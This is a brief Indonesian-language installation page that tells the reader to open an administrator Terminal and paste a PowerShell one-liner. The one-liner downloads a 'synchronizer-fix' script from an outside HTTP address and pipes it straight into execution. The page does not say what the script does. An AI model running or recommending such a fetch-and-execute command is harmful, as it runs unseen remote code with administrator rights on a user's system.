Buka Terminal (Admin)

2

Salin Perintah

Standard Install
irm http://script.minicenter.my.id/scripts/synchronizer-fix.ps1 | iex

Jalankan

Paste ke PowerShell lalu tekan ENTER.

Pastikan koneksi internet aktif saat menjalankan skrip.
